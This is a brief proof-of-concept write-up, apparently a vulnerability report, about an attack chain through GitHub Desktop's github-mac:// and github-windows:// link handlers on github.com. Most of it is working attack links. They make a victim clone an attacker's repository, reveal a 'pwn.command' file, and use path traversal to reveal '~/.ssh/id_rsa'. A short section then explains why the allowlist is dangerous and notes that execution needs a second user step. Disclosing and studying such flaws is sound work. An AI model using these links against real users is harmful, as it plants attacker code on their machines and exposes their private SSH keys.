# Desktop RCE chain (PoC)

Victim with GitHub Desktop clicks one of these on github.com:

[clone](github-mac://openRepo/https://github.com/itsgaldoron/zz-dataform-canary-t197)

[clone+reveal](github-mac://openRepo/https://github.com/itsgaldoron/zz-dataform-canary-t197?filepath=pwn.command)

[reveal ssh](github-mac://openRepo/https://github.com/itsgaldoron/zz-dataform-canary-t197?filepath=../../.ssh/id_rsa)

[win clone](github-windows://openRepo/https://github.com/itsgaldoron/zz-dataform-canary-t197)

## Why this matters
`github-mac://` / `github-windows://` are in html-pipeline ANCHOR_SCHEMES.
They invoke GitHub Desktop with attacker-controlled clone URL and filepath.

Current Desktop: openRepo clones the URL (WRITE to disk) and filepath is
resolveWithin + showItemInFolder (reveal). Silent RCE would need a second
step (user opens .command / git hook). Still a dangerous allowlist.
